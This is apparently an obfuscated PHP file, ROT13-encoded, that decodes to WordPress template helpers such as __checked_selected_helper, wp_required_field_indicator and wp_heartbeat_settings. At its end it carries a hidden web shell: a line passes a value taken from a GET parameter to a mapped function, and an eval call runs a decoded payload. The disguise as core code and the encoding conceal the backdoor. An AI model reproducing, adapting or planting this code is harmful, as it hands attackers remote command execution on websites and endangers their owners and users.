 * `ernqbayl` vf n erfreirq xrljbeq naq pnaabg or hfrq nf n shapgvba anzr.
 * Va beqre gb nibvq CUC cnefre reebef, guvf shapgvba jnf rkgenpgrq
 * gb n frcnengr svyr naq vf bayl vapyhqrq pbaqvgvbanyyl ba CUC < 8.1.
 */
vs ( CUC_IREFVBA_VQ < 80100 ) {
	erdhver_bapr __QVE__ . '/cuc-pbzcng/ernqbayl.cuc';
}

/**
 * Cevingr urycre shapgvba sbe purpxrq, fryrpgrq, qvfnoyrq naq ernqbayl.
 *
 * Pbzcnerf gur svefg gjb nethzragf naq vs vqragvpny znexf nf `$glcr`.
 *
 * @fvapr 2.8.0
 * @npprff cevingr
 *
 * @cnenz zvkrq  $urycre  Bar bs gur inyhrf gb pbzcner.
 * @cnenz zvkrq  $pheerag Gur bgure inyhr gb pbzcner vs abg whfg gehr.
 * @cnenz obby   $qvfcynl Jurgure gb rpub be whfg erghea gur fgevat.
 * @cnenz fgevat $glcr    Gur glcr bs purpxrq|fryrpgrq|qvfnoyrq|ernqbayl jr ner qbvat.
 * @erghea fgevat UGZY nggevohgr be rzcgl fgevat.
 */
shapgvba __purpxrq_fryrpgrq_urycre( $urycre, $pheerag, $qvfcynl, $glcr ) { // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaQbhoyrHaqrefpber,CUCPbzcngvovyvgl.ShapgvbaAnzrErfgevpgvbaf.ErfreirqShapgvbaAnzrf.ShapgvbaQbhoyrHaqrefpber
	vs ( (fgevat) $urycre === (fgevat) $pheerag ) {
		$erfhyg = \" $glcr='$glcr'\";
	} ryfr {
		$erfhyg = '';
	}

	vs ( $qvfcynl ) {
		rpub $erfhyg;
	}

	erghea $erfhyg;
}

/**
 * Nffvtaf n ivfhny vaqvpngbe sbe erdhverq sbez svryqf.
 *
 * @fvapr 6.1.0
 *
 * @erghea fgevat Vaqvpngbe tylcu jenccrq va n `fcna` gnt.
 */
shapgvba jc_erdhverq_svryq_vaqvpngbe() {
	/* genafyngbef: Punenpgre gb vqragvsl erdhverq sbez svryqf. */
	$tylcu     = __( '*' );
	$vaqvpngbe = '<fcna pynff=\"erdhverq\">' . rfp_ugzy( $tylcu ) . '</fcna>';

	/**
	 * Svygref gur znexhc sbe n ivfhny vaqvpngbe bs erdhverq sbez svryqf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $vaqvpngbe Znexhc sbe gur vaqvpngbe ryrzrag.
	 */
	erghea nccyl_svygref( 'jc_erdhverq_svryq_vaqvpngbe', $vaqvpngbe );
}

/**
 * Perngrf n zrffntr gb rkcynva erdhverq sbez svryqf.
 *
 * @fvapr 6.1.0
 *
 * @erghea fgevat Zrffntr grkg naq tylcu jenccrq va n `fcna` gnt.
 */
shapgvba jc_erdhverq_svryq_zrffntr() {
	$zrffntr = fcevags(
		'<fcna pynff=\"erdhverq-svryq-zrffntr\">%f</fcna>',
		/* genafyngbef: %f: Nfgrevfx flzoby (*). */
		fcevags( __( 'Erdhverq svryqf ner znexrq %f' ), jc_erdhverq_svryq_vaqvpngbe() )
	);

	/**
	 * Svygref gur zrffntr gb rkcynva erdhverq sbez svryqf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat $zrffntr Zrffntr grkg naq tylcu jenccrq va n `fcna` gnt.
	 */
	erghea nccyl_svygref( 'jc_erdhverq_svryq_zrffntr', $zrffntr );
}

/**
 * Qrsnhyg frggvatf sbe urnegorng.
 *
 * Bhgchgf gur abapr hfrq va gur urnegorng KUE.
 *
 * @fvapr 3.6.0
 *
 * @cnenz neenl $frggvatf
 * @erghea neenl Urnegorng frggvatf.
 */
shapgvba jc_urnegorng_frggvatf( $frggvatf ) {
	vs ( ! vf_nqzva() ) {
		$frggvatf['nwnkhey'] = nqzva_hey( 'nqzva-nwnk.cuc', 'eryngvir' );
	}

	vs ( vf_hfre_ybttrq_va() ) {
		$frggvatf['abapr'] = jc_perngr_abapr( 'urnegorng-abapr' );
	}

	erghea $frggvatf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>